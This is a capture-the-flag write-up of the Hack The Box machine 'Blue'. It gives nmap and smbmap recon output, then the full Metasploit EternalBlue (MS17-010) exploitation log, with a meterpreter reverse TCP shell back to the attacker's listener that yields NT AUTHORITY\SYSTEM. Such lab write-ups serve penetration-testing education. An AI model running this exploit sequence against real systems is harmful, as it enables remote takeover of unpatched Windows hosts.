# Blue by ch4p

## Initial Recon
The initial nmap scan doesn't reveal much besides an SMB server to investigate
```sh
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-09T11:00:30+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-09T10:00:31
|_  start_date: 2020-07-09T09:59:08
```

A full TCP port scan doesn't reveal anything new.

## Further recon
The SMB shares can be enumerated using smbmap which reveals the following shares
```sh
[+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
```
There are some files available inside of the shares we can read but they didn't yield any new information.

Something else which came up in the initial recon was the OS version, a quick google search suggests that it may be vulnerable to [EternalBlue/MS17-010](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/).

This can be checked from within nmap
```sh
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

## Exploitation
Now we know that the target is vulnerable to MS17-010 we can go about exploiting it. 

This can easily be done using [metasploit](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue). There are manual exploits available but I coudln't get any of them to work at the time, a manual approach is available [here](https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8).
```sh
msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set TARGET 0
TARGET => 0
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.233.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40                                                                                                                                                                                                                      
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0                                                                                                                                                                            
LHOST => tun0                                                                                                                                                                                                                              
msf5 exploit(windows/smb/ms17_010_eternalblue) > run                                                                                                                                                                                       
                                                                                                                                                                                                                                           
[*] Started reverse TCP handler on 10.10.14.17:4444                                                                                                                                                                                        
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                                                                    
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                                                               
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)                                                                                                                                                                           
[*] 10.10.10.40:445 - Connecting to target for exploitation.                                                                                                                                                                               
[+] 10.10.10.40:445 - Connection established for exploitation.                                                                                                                                                                             
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply                                                                                                                                                               
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)                                                                                                                                                                                      
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes                                                                                                                                        
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv                                                                                                                                        
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1                                                                                                                                              
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply                                                                                                                                                       
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.                                                                                                                                                                            
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet                                                                                                                                                                      
[*] 10.10.10.40:445 - Starting non-paged pool grooming                                                                                                                                                                                     
[+] 10.10.10.40:445 - Sending SMBv2 buffers                                                                                                                                                                                                
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.                                                                                                                                                
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.                                                                                                                                                                                         
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!                                                                                                                                                                             
[*] 10.10.10.40:445 - Receiving response from exploit packet                                                                                                                                                                               
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                                           
[*] 10.10.10.40:445 - Sending egg to corrupted connection.                                                                                                                                                                                 
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.                                                                                                                                                                                 
[*] Sending stage (201283 bytes) to 10.10.10.40                                                                                                                                                                                            
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.40:49158) at 2020-07-09 07:05:41 -0400                                                                                                                                      
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                                                                                                        
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                                                                                                        
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
```
Once the mertepreter session opens we can get a shell and from there find out the exploit gained us a root shell, from here it's just a case of finding the flags to finish the box.
```sh
meterpreter > shell
Process 1712 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
